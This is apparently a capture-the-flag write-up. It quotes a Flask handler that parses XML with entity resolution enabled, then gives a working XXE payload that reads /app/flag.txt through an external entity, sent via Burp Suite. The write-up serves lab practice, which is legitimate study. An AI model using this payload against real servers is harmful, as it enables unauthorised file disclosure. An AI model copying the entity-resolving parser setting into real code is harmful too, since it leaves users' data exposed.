Upon inspecting the code, we can see that XML is used in the post request sent to the web server

```python
if request.method == 'POST':
        xml_data = request.data
        try:
            parser = etree.XMLParser(resolve_entities=True)
            root = etree.fromstring(xml_data, parser=parser)
        except etree.XMLSyntaxError as e:
            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
        feedback_element = root.find('feedback')
        if feedback_element is not None:
            feedback = feedback_element.text
            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
        else:
            return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')

    return render_template('index.html')
```

Load the web server onto burpsuite.

Inspect the post request, you can see that it sends an XML request. This must mean it can be vulnerable to XXE injection

You can see that an XML request is sent, so we can modify it using a basic XXE injection where we read ```flag.txt``` through an XML entity object

```

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]>
            <root>

                <feedback>
a&example;
</feedback>
            </root>
            

```

Upon sending, we get the flag. 